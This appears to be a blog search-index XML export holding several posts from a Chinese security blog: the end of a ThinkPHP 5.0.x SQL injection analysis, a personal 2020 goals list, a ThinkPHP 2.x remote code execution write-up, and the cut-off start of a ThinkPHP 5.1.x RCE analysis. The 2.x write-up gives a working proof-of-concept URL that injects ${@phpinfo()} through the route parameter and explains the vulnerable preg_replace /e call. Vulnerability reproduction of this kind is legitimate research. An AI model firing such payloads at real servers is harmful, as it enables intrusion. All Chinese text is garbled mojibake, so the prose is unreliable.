supported</code>çš„é”™è¯¯</p><p>æ‰€ä»¥è¿™ä¸ªsqlæ³¨å…¥æœ‰ç‚¹ä¸è¡Œ,ä½†æ—¶sqlæŠ¥é”™ä¼šæš´éœ²æ•°æ®åº“é…ç½®å´æ˜¯éå¸¸æœ‰ç”¨çš„</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html" target="_blank" rel="noopener">https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html</a> </p><p> <a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/02/01/ThinkPHPæ¡†æ¶5.0.x_SQLæ³¨å…¥åˆ†æ/">http://blog.ccreater.top/2020/02/01/ThinkPHPæ¡†æ¶5.0.x_SQLæ³¨å…¥åˆ†æ/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æˆ‘çš„2020</title>
      <link href="/2020/01/31/%E6%88%91%E7%9A%842020/"/>
      <url>/2020/01/31/%E6%88%91%E7%9A%842020/</url>
      
        <content type="html"><![CDATA[<h1 id="æˆ‘çš„2020"><a href="#æˆ‘çš„2020" class="headerlink" title="æˆ‘çš„2020"></a>æˆ‘çš„2020</h1><h2 id="è¿™ä¸ªæ˜¯å•¥"><a href="#è¿™ä¸ªæ˜¯å•¥" class="headerlink" title="è¿™ä¸ªæ˜¯å•¥"></a>è¿™ä¸ªæ˜¯å•¥</h2><p>è¿™æ˜¯ä¸€ä¸ªç›®æ ‡æ¸…å•,æ¥è®°å½•æˆ‘2020å¹´æƒ³è¦å®Œæˆçš„äº‹æƒ….</p><h2 id="å†™è¿™ä¸ªçš„åŸå› "><a href="#å†™è¿™ä¸ªçš„åŸå› " class="headerlink" title="å†™è¿™ä¸ªçš„åŸå› "></a>å†™è¿™ä¸ªçš„åŸå› </h2><p><strong>æˆ‘æƒ³è¦åœ¨å¤§å­¦æ¯•ä¸šå,å¾ˆè‡ªç„¶çš„è®¤ä¸º:æˆ‘çš„å¤§å­¦æ˜¯å……å®çš„,æ˜¯æˆ‘æ¯ä¸€å¤©è®¤è®¤çœŸçœŸçš„èµ°è¿‡å»çš„.æˆ‘å¯ä»¥è‡ªè±ªçš„æ‰¿è®¤è‡ªå·±çš„ä¼˜ç§€</strong></p><p><img src="https://i.loli.net/2020/01/31/7OHm9wbEsVYgfd3.png" alt="image173"></p><p>æˆ‘æƒ³è¦å˜å¾—æ›´åŠ ä¼˜ç§€,æˆ‘æƒ³æ´»å‡ºè‡ªå·±</p><h2 id="å¦‚ä½•æ›´æ–°-æ›´æ–°è§„åˆ™"><a href="#å¦‚ä½•æ›´æ–°-æ›´æ–°è§„åˆ™" class="headerlink" title="å¦‚ä½•æ›´æ–°/æ›´æ–°è§„åˆ™"></a>å¦‚ä½•æ›´æ–°/æ›´æ–°è§„åˆ™</h2><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ol><li>ç›®æ ‡æ˜¯æ¸…æ™°æ˜ç¡®çš„,é‡åŒ–çš„</li><li>ç›®æ ‡éš¾åº¦è¦é€‚åˆ,ä¸èƒ½å¤ªç®€å•ä¹Ÿä¸èƒ½ä¸å¯å®ç°</li><li>å¦‚æœæ— æ³•ç¡®å®šä»Šå¹´çš„ç›®æ ‡,é‚£å°±ç¡®å®šè¿™ä¸ªæœˆçš„å§</li><li>æ ¹æ®å®é™…æƒ…å†µå¯¹ç›®æ ‡è¿›è¡Œè°ƒæ•´</li><li>ä»è‡ªå·±æ‰€èƒ½æƒ³åˆ°çš„æœ€è¿œçš„åœ°æ–¹(ç›®æ ‡/æ¢¦æƒ³/æƒ³æ³•)å¼€å§‹åˆ¶å®šç›®æ ‡</li></ol><h3 id="è§£é‡Š"><a href="#è§£é‡Š" class="headerlink" title="è§£é‡Š"></a>è§£é‡Š</h3><ol><li>ä¸¾ä¾‹:æˆ‘è¦å¥½å¥½å­¦ä¹ (x); æˆ‘è¦å­¦ä¹ ç¼–ç¨‹æ–¹é¢çš„çŸ¥è¯†,è¾¾åˆ°èƒ½å¤Ÿç‹¬ç«‹ç¼–å†™è‡ªå·±çš„åšå®¢ç³»ç»Ÿ(âˆš)</li><li>å¤ªç®€å•çš„ç›®æ ‡æœ‰å¿…è¦åˆ¶å®šå—,æ— æ³•å®ç°çš„ç›®æ ‡æœ‰å¿…è¦å†™ä¸‹æ¥å—.éš¾åº¦é€‚åˆçš„ç›®æ ‡å¯ä»¥ç»™äºˆè‡ªå·±ä¸€ç§æ­£åé¦ˆ,ä½¿è‡ªå·±æ›´æœ‰ä¿¡å¿ƒå®ç°ç›®æ ‡,å¹¶èƒ½ä»ä¸­è·å–ä¹è¶£</li><li>è¡ŒåŠ¨æ˜¯æœ‰ç›®çš„çš„ï¼Œè€Œä»é«˜åˆ°ä½ï¼Œä»æ•´ä½“åˆ°å±€éƒ¨ï¼Œä¼šè®©ä½ æ¸…æ™°çš„è®¤è¯†åˆ°ä½ ç°åœ¨è¦æ€ä¹ˆåšï¼Œä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšï¼Œä½ æœªæ¥çš„è·¯åœ¨ä½•æ–¹ä¼šæ›´åŠ æ¸…æ™°ï¼Œå¦‚æœæŸä¸ªåœ°æ–¹ä½ æƒ³ä¸å‡ºæ¥ï¼Œé‚£å°±ç¼©å°èŒƒå›´ï¼Œä½ æ— æ³•è€ƒè™‘ä½ äººç”Ÿçš„ç›®çš„ï¼Œä½†ä½ å¯ä»¥æ€è€ƒæœªæ¥10å¹´çš„æ–¹å‘ï¼Œå¯èƒ½æœªæ¥åå¹´ä¹Ÿå¤ªéš¾ä¸‹å®šè®ºï¼Œæœªæ¥ä¸€å¹´ï¼Œä¸€ä¸ªæœˆï¼Œä¸€æ˜ŸæœŸå´æ˜¯å¯ä»¥çš„ã€‚ </li><li>å› ä¸ºå‘¨å›´çš„å˜åŒ–,å¯¹ç›®æ ‡çš„ä¸äº†è§£ç­‰ç­‰å› ç´ å¯¼è‡´å¯èƒ½ä¼šåˆ¶å®šè¿‡éš¾/è¿‡æ˜“/æ²¡æœ‰æ„ä¹‰çš„ç›®æ ‡,æ‰€ä»¥è¦æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œè°ƒæ•´(ä¸æ˜¯å«æˆ‘å·æ‡’å“¦)</li><li>å°ç›®æ ‡æ°¸è¿œæ˜¯ä¸ºå¤§ç›®æ ‡/æ¢¦æƒ³/æƒ³æ³•æœåŠ¡çš„</li></ol><h2 id="å°†ç›®æ ‡è½¬ä¸ºè®¡åˆ’çš„è§„åˆ™"><a href="#å°†ç›®æ ‡è½¬ä¸ºè®¡åˆ’çš„è§„åˆ™" class="headerlink" title="å°†ç›®æ ‡è½¬ä¸ºè®¡åˆ’çš„è§„åˆ™"></a>å°†ç›®æ ‡è½¬ä¸ºè®¡åˆ’çš„è§„åˆ™</h2><ol><li>åˆ†è§£ç»†è‡´ï¼Œèƒ½åŠ›å¯è¾¾ï¼Œç•™æœ‰ä½™åœ°</li><li>å¥–æƒ©å¹¶è¡Œ</li><li>æ¯ä¸ªæ˜ŸæœŸæ€»ç»“ä¸€æ¬¡,è®¡åˆ’æ˜¯å¦åˆç†</li></ol><h2 id="æ‰€èƒ½æƒ³åˆ°çš„æœ€è¿œçš„ç›®æ ‡-æƒ³æ³•-æ¢¦æƒ³"><a href="#æ‰€èƒ½æƒ³åˆ°çš„æœ€è¿œçš„ç›®æ ‡-æƒ³æ³•-æ¢¦æƒ³" class="headerlink" title="æ‰€èƒ½æƒ³åˆ°çš„æœ€è¿œçš„ç›®æ ‡/æƒ³æ³•/æ¢¦æƒ³"></a>æ‰€èƒ½æƒ³åˆ°çš„æœ€è¿œçš„ç›®æ ‡/æƒ³æ³•/æ¢¦æƒ³</h2><ol><li>åœ¨è‡ªå·±çƒ­çˆ±çš„äº‹ä¸šä¸Šè·å¾—å¯è§‚çš„æ”¶å…¥,æˆä¸ºä¼˜ç§€çš„ç™½å¸½å­</li><li>èº«ä½“å¥åº·,ä¸‰è§‚å°šåœ¨ </li><li>å¼€å‘ä¸€ä¸ªç±»ä¼¼hexoçš„pythonç¨‹åº</li><li>è¿›å…¥è¡¥å¤©å‰1000å</li></ol><h2 id="å…·ä½“å†…å®¹"><a href="#å…·ä½“å†…å®¹" class="headerlink" title="å…·ä½“å†…å®¹"></a>å…·ä½“å†…å®¹</h2><h3 id="å¥–æƒ©è§„åˆ™"><a href="#å¥–æƒ©è§„åˆ™" class="headerlink" title="å¥–æƒ©è§„åˆ™"></a>å¥–æƒ©è§„åˆ™</h3><p>æ—¶é—´åˆ†ä¸ºä¸‰ç§:ä¸“æ³¨æ—¶é—´,è‡ªç”±æ—¶é—´,æ‚;ä¸å¾—ä¸å¹²ä¸”å¹¶éåœ¨è®¡åˆ’ä¸­ä¸”æ²¡æœ‰å¹²å…¶ä»–ä¸æ˜¯ä¸å¾—ä¸å¹²çš„äº‹æƒ…çš„æ—¶é—´ç§°ä¸º:æ‚</p><ol><li>æ¯ä¸“æ³¨äºç›®æ ‡2ä¸ªå°æ—¶å°±å¯ä»¥ä»»æ„æ”¯é…1ä¸ªå°æ—¶çš„æ—¶é—´</li><li>ä¸“æ³¨è¿‡ç¨‹ä¸­è·‘å»ç©,ä»å¤´æ¥è¿‡,è®¡æ—¶æ¸…é›¶</li><li>æ²¡æœ‰è®¤çœŸæ‰§è¡Œ,é”€æ¯è¿™ä»½è®¡åˆ’</li></ol><h3 id="å¯’å‡"><a href="#å¯’å‡" class="headerlink" title="å¯’å‡"></a>å¯’å‡</h3><p>å¯’å‡æœŸé—´å»¶è¿Ÿåˆ°2.22(ä¸æ”¹æˆ‘å®Œæˆä¸äº†æ‹‰)</p><ul><li><input checked="" disabled="" type="checkbox"> å¯’å‡æœŸé—´è¡¥å¤©æŒ–æ´è·å¾—18ä¸ªåº“å¸(ä¹°è¿™ä¸ª <a href="https://www.butian.net/Shop/detail/?id=700399" target="_blank" rel="noopener">https://www.butian.net/Shop/detail/?id=700399</a> )</li><li><input disabled="" type="checkbox"> å¯’å‡æœŸé—´å¤ç°30ä¸ªcve(13/30)  , å¤±è´¥,åé¢å°±å¼€å§‹æ”¾çºµè‡ªå·±å‘¢</li><li><input disabled="" type="checkbox"> å¯’å‡æœŸé—´ä»£ç å®¡è®¡ä¸€ä¸ªå°cms,æ‰¾å‡ºå°½å¯èƒ½å¤šçš„æ¼æ´ ,å¤±è´¥</li><li><input checked="" disabled="" type="checkbox"> å¯’å‡çœ‹å®Œç å†œç¿»èº«(3/3)</li></ul><h3 id="3æœˆä»½"><a href="#3æœˆä»½" class="headerlink" title="3æœˆä»½"></a>3æœˆä»½</h3><p>3.11-3.31</p><ul><li><input disabled="" type="checkbox"> å¤ç°20ä¸ªcve(0/20)</li><li><input disabled="" type="checkbox"> çœ‹å®Œä¸€æœ¬ä¹¦(æœªå®š)</li><li><input checked="" disabled="" type="checkbox"> çœ‹å®Œé‚£æœ¬linuxä¹¦ç±</li><li><input disabled="" type="checkbox"> buuoj40é¢˜(8/40)</li><li><input disabled="" type="checkbox"> å†æŒ–å‡º20ä¸ªåº“å¸</li></ul><h3 id="4æœˆä»½"><a href="#4æœˆä»½" class="headerlink" title="4æœˆä»½"></a>4æœˆä»½</h3><ul><li><input disabled="" type="checkbox"> å¤ç°30ä¸ªcve(5/30)</li><li><input checked="" disabled="" type="checkbox"> çœ‹å®Œä¸€æœ¬ä¹¦(æ˜æœé‚£äº›äº‹)</li><li><input disabled="" type="checkbox"> buuoj50é¢˜(30/50)</li><li><input disabled="" type="checkbox"> æŒ–20ä¸ªåº“å¸(5/20)ä¸æ˜¯æˆ‘ä¸åŠªåŠ›ï¼Œä¸€å †é‡å¤ã€‚ã€‚</li><li><input disabled="" type="checkbox"> æˆ‘çš„ä¸–ç•Œå†™ä¸€ä¸ªmod</li></ul><h3 id="5æœˆä»½"><a href="#5æœˆä»½" class="headerlink" title="5æœˆä»½"></a>5æœˆä»½</h3><ul><li><input checked="" disabled="" type="checkbox"> çœ‹å®Œä¸€æœ¬ä¹¦ï¼ˆæ˜æœé‚£äº›äº‹äºŒï¼‰</li><li><input disabled="" type="checkbox"> ctfé¢˜ç›®50é¢˜(14/50)</li><li><input checked="" disabled="" type="checkbox"> è¡¥å¤©30ä¸ªåº“å¸(150/30)</li><li><input disabled="" type="checkbox"> æ¸—é€é¶åœº3ä¸ª(0/3)</li><li><input disabled="" type="checkbox"> æ¯å¤©å­¦ä¹ 8å°æ—¶ä»¥ä¸Š(20/30)</li></ul><h3 id="6æœˆä»½"><a href="#6æœˆä»½" class="headerlink" title="6æœˆä»½"></a>6æœˆä»½</h3><ul><li><input checked="" disabled="" type="checkbox"> è‡³å°‘é˜…è¯»ä¸€æœ¬ä¹¦</li><li><input disabled="" type="checkbox"> å‘ç°æœ‰è¶£çš„ä¸œè¥¿</li><li><input checked="" disabled="" type="checkbox"> å°è¯•è¡¥å¤©å…¬æµ‹ï¼Œå¿«ä¹å°±å¥½</li><li><input disabled="" type="checkbox"> æ¸—é€é¶åœºç©ç©</li><li><input disabled="" type="checkbox"> xctf,rctf â€¦å†å±Šé¢˜ç›®å¤ç°</li></ul><h4 id="7æœˆä»½"><a href="#7æœˆä»½" class="headerlink" title="7æœˆä»½"></a>7æœˆä»½</h4><ul><li><input disabled="" type="checkbox"> æŠŠ<a href="https://portswigger.net/web-security" target="_blank" rel="noopener">burp</a> é‡Œä¸å¤ªä¼šçš„å­¦å®Œ</li></ul><h2 id="åæ€"><a href="#åæ€" class="headerlink" title="åæ€"></a>åæ€</h2><h3 id="å¯’å‡-1"><a href="#å¯’å‡-1" class="headerlink" title="å¯’å‡"></a>å¯’å‡</h3><p>å‰æœŸåšçš„æŒºå¥½çš„,åé¢å› ä¸ºæ²¡æœ‰è®¡åˆ’/ä¸å¤ªä¼šåˆ¶å®šè®¡åˆ’,å°±è¶Šæ¥è¶Šæµª</p><h3 id="3æœˆä»½-1"><a href="#3æœˆä»½-1" class="headerlink" title="3æœˆä»½"></a>3æœˆä»½</h3><p>3æœˆä»½æ˜¯çœŸçš„å½»åº•æ‘¸é±¼è¿‡å»,æµ‘æµ‘å™©å™©æ²¡æœ‰ç›®æ ‡æ²¡æœ‰è®¡åˆ’,ä½†æ˜¯æœ‰å¾ˆå¤šå€Ÿå£</p><p>æœ€å¸¸ç”¨çš„æ˜¯:æˆ‘è¦æ‰¾åˆ°æˆ‘çƒ­çˆ±çš„ç›®æ ‡,å“ªæœ‰ä»€ä¹ˆä¸œè¥¿èƒ½è®©ä½ åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸€ç›´çƒ­çˆ±,è¿‡ç¨‹å¿…ç„¶è¾›è‹¦,è¿™ä¹Ÿæ˜¯æœ€åå®ç°æ—¶å¿«ä¹çš„ç‡ƒæ–™,ä¸è¿‡æ¢ä¸€ç§æ€è€ƒè§’åº¦å°±æœ‰å¯èƒ½ä¸è§‰å¾—è¾›è‹¦äº†</p><p>æ€»ç»“:é€‰æ‹©ä¸€ä¸ªç›®æ ‡,ä¸¥æ ¼è¦æ±‚è‡ªå·±,è®°å½•ä¸‹æ¯å¤©æ‰€åšçš„äº‹æƒ…</p><h3 id="4æœˆä»½-1"><a href="#4æœˆä»½-1" class="headerlink" title="4æœˆä»½"></a>4æœˆä»½</h3><p>æ€»çš„æ¥è¯´è¿˜æ˜¯å¶å°”æ‘¸é±¼å¶å°”åŠªåŠ›ï¼Œæ²¡æœ‰ç›®æ ‡ï¼Œè¯¥ä¸ºæœªæ¥çš„å·¥ä½œåŠªåŠ›ä¸‹äº†ã€‚4æœˆå’Œå­¦é•¿ä¸€èµ·å¼€å‘äº†ä¸€ä¸ªè‡ªåŠ¨æ¼æ‰«å·¥å…·æ„Ÿè§‰è¿˜ä¸é”™ã€‚5æœˆä»½è‡ªå¾‹ä¸‹å§ï¼Œæ¯•ç«Ÿä»¥å‰æˆ‘è¿˜æ˜¯æŒºè‡ªå¾‹çš„ã€‚4æœˆä»½çš„ç›®æ ‡æ²¡æœ‰å…¨éƒ¨å®Œæˆï¼Œå®Œæˆä¸€åŠå¤§æ¦‚è¿˜æ˜¯æœ‰çš„ã€‚æœç„¶åæ€è¿˜æ˜¯è¦æœ‰ç‚¹åˆ‡å…¥ç‚¹çš„ï¼Œä¸ç„¶ä¸çŸ¥é“åœ¨å†™å•¥ã€‚</p><h3 id="5æœˆä»½-1"><a href="#5æœˆä»½-1" class="headerlink" title="5æœˆä»½"></a>5æœˆä»½</h3><p>4æœˆä»½å†™çš„è„šæœ¬çœŸçš„å¾ˆç»™åŠ›ï¼Œä¸€ä¸‹æŒ–äº†å¾ˆå¤šæ´ï¼Œå°±æ˜¯å¤ªè´¹æ—¶äº†ã€‚ã€‚åŸºæœ¬ä¸ŠåŠä¸ªæœˆæ¯å¤©4ä¸ªå°æ—¶éƒ½åœ¨æŒ–æ´ã€‚ã€‚ã€‚å…¶å®æ•´ä¸ªåœ¨å®¶çš„æœŸé—´éƒ½æ²¡æœ‰åŠ¨åŠ›ï¼Œå§‹ç»ˆéƒ½æ˜¯åšç€ä¸€äº›é‡å¤çš„åŠ³åŠ¨ï¼Œå€’æ²¡æœ‰å»å­¦ä¹ ã€‚å¸Œæœ›è‡ªå·±èƒ½å¤Ÿå› ä¸ºå…´è¶£è€Œç ”ç©¶ï¼Œå­¦ä¹ ã€‚å°±è¿™æ ·</p><h2 id="æ‚"><a href="#æ‚" class="headerlink" title="æ‚"></a>æ‚</h2><p>æœ€è¿‘åˆè¢«æ²¡æœ‰ç†æƒ³å’Œç›®æ ‡æ‰€å›°æ‰°,åˆ°åº•æ˜¯æˆ‘æ²¡æœ‰è¿˜æ˜¯æˆ‘ä¸æƒ³æœ‰,åæ­£æœ€è¿‘æ˜¯æŒºæ— èŠçš„.å¤šçœ‹ç‚¹ä¹¦,å¤šæ€è€ƒä¸€ä¸‹å§</p><p>æˆ‘è¦æ‰¾åˆ°æˆ‘çƒ­çˆ±çš„ç›®æ ‡,å“ªæœ‰ä»€ä¹ˆä¸œè¥¿èƒ½è®©ä½ åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸€ç›´çƒ­çˆ±,è¿‡ç¨‹å¿…ç„¶è¾›è‹¦,è¿™ä¹Ÿæ˜¯æœ€åå®ç°æ—¶å¿«ä¹çš„ç‡ƒæ–™,ä¸è¿‡æ¢ä¸€ç§æ€è€ƒè§’åº¦å°±æœ‰å¯èƒ½ä¸è§‰å¾—è¾›è‹¦äº†</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/01/31/æˆ‘çš„2020/">http://blog.ccreater.top/2020/01/31/æˆ‘çš„2020/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ‚ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 2.xä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</title>
      <link href="/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-2-xä»»æ„ä»£ç æ‰§è¡Œæ¼æ´"><a href="#ThinkPHP-2-xä»»æ„ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="ThinkPHP 2.xä»»æ„ä»£ç æ‰§è¡Œæ¼æ´"></a>ThinkPHP 2.xä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</h1><h2 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h2><p>thinkphp 2.1</p><p>å®˜ç½‘çš„thinkphp 2.2å·²ç»ä¿®å¤äº†</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ¼æ´ä½ç½®</p><p><img src="https://i.loli.net/2020/01/30/8UW5mxvARaoFlPX.png" alt="image154"></p><p>è·¯ç”±è§£æå¤„</p><p><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></p><p>è¿™ä¸ªpreg_replaceæœ‰ç‚¹å¤æ€ª,æ²¡æœ‰ç”¨<code>/</code>æ¥åŒ…å›´æœç´¢æ¨¡å¼è€Œæ˜¯ç”¨<code>@</code>,æŸ¥æ‰¾å…³äºpregçš„æ–‡æ¡£å‘ç°</p><blockquote><p>å½“ä½¿ç”¨ PCRE å‡½æ•°çš„æ—¶å€™ï¼Œæ¨¡å¼éœ€è¦ç”±<em>åˆ†éš”ç¬¦</em>é—­åˆåŒ…è£¹ã€‚åˆ†éš”ç¬¦å¯ä»¥ä½¿ä»»æ„éå­—æ¯æ•°å­—ã€éåæ–œçº¿ã€éç©ºç™½å­—ç¬¦ã€‚   </p><p> ç»å¸¸ä½¿ç”¨çš„åˆ†éš”ç¬¦æ˜¯æ­£æ–œçº¿(<em>/</em>)ã€hashç¬¦å·(<em>#</em>)   ä»¥åŠå–åç¬¦å·(<em>~</em>)ã€‚ä¸‹é¢çš„ä¾‹å­éƒ½æ˜¯ä½¿ç”¨åˆæ³•åˆ†éš”ç¬¦çš„æ¨¡å¼ã€‚    </p><pre><code>/foo bar/#^[^0-9]$#+php+%[a-zA-Z0-9_-]%</code></pre></blockquote><p>æ›¿æ¢å¸¸é‡,è¿™ä¸ªå°±å˜æˆäº†</p><p><code>preg_replace(&#39;@(\w+)/([^\/\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode(&#39;/&#39;,$paths));</code></p><p>æŸ¥çœ‹preg_replaceçš„ä»‹ç»å‘ç°</p><blockquote><p>å½“ä½¿ç”¨è¢«å¼ƒç”¨çš„ e ä¿®é¥°ç¬¦æ—¶, è¿™ä¸ªå‡½æ•°ä¼šè½¬ä¹‰ä¸€äº›å­—ç¬¦(å³ï¼šâ€™ã€â€ã€ \ å’Œ NULL) ç„¶åè¿›è¡Œåå‘å¼•ç”¨æ›¿æ¢ã€‚å½“è¿™äº›å®Œæˆåè¯·ç¡®ä¿åå‘å¼•ç”¨è§£æå®Œåæ²¡æœ‰å•å¼•å·æˆ–åŒå¼•å·å¼•èµ·çš„è¯­æ³•é”™è¯¯(æ¯”å¦‚ï¼š â€˜strlen(&#39;$1&#39;)+strlen(â€œ$2â€)â€™)ã€‚ç¡®ä¿ç¬¦åˆPHPçš„ å­—ç¬¦ä¸²è¯­æ³•ï¼Œå¹¶ä¸”ç¬¦åˆevalè¯­æ³•ã€‚å› ä¸ºåœ¨å®Œæˆæ›¿æ¢åï¼Œå¼•æ“ä¼šå°†ç»“æœå­—ç¬¦ä¸²ä½œä¸ºphpä»£ç ä½¿ç”¨evalæ–¹å¼è¿›è¡Œè¯„ä¼°å¹¶å°†è¿”å›å€¼ä½œä¸ºæœ€ç»ˆå‚ä¸æ›¿æ¢çš„å­—ç¬¦ä¸²ã€‚ </p></blockquote><p>æ‰§è¡Œ<code>$replacement</code>(ç¬¬äºŒä¸ªå‚æ•°)å‰,ä¼šå…ˆæ›¿æ¢æ‰å¼•ç”¨</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°,<code>$replacement</code>ç”¨åŒå¼•å·æ¥åŒ…å›´å¼•ç”¨<code>\\2</code>,ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><p>æ„é€ </p><pre><code class="php">$paths=array(    &#39;xxxx&#39;,    &#39;${phpinfo()}&#39;);</code></pre><p>åˆ™<code>&#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;</code>å˜ä¸º<code>$var[&#39;xxxx&#39;]=&quot;${phpinfo()}&quot;;</code></p><p>ä»è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><p>äºæ˜¯æ„é€ payload</p><p><code>[http://127.0.0.1/public/index.php?s=/index/index/name/$%7B@phpinfo()%7D](http://127.0.0.1/public/index.php?s=/index/index/name/${@phpinfo()})</code></p><h2 id="è¡¥ä¸åˆ†æ"><a href="#è¡¥ä¸åˆ†æ" class="headerlink" title="è¡¥ä¸åˆ†æ"></a>è¡¥ä¸åˆ†æ</h2><p><img src="https://i.loli.net/2020/01/30/9AlHbyKzaBOJXnR.png" alt="image1293"></p><p>ç”¨å•å¼•å·æ¥åŒ…å›´æ‰€æœ‰å¼•ç”¨å°±å¯ä»¥é¿å…å‘½ä»¤æ‰§è¡Œ</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 2.xä»»æ„ä»£ç æ‰§è¡Œæ¼æ´/](<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 2.xä»»æ„ä»£ç æ‰§è¡Œæ¼æ´/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 5.1.x-5.2.xå…¨ç‰ˆæœ¬RCE æ¼æ´åˆ†æ</title>
      <link href="/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-5-1-x-5-2-xå…¨ç‰ˆæœ¬RCE-æ¼æ´åˆ†æ"><a href="#ThinkPHP-5-1-x-5-2-xå…¨ç‰ˆæœ¬RCE-æ¼æ´åˆ†æ" class="headerlink" title="ThinkPHP 5.1.x-5.2.xå…¨ç‰ˆæœ¬RCE æ¼æ´åˆ†æ"></a>ThinkPHP 5.1.x-5.2.xå…¨ç‰ˆæœ¬RCE æ¼æ´åˆ†æ</h1><h2 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h2><p>5.1.x-5.1.32  5.2.x(è¿™ä¸ªè¿˜æ²¡å»çœ‹)</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>è¡¥ä¸: <a href="https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6</a> </p><p>æµ‹è¯•ç¯å¢ƒ 5.1.29</p><p><strong>å…¥å£å¤„å…³é—­æŠ¥é”™</strong> </p><p><img src="https://i.loli.net/2020/01/30/2x4QWZYgmXjqo8r.png" 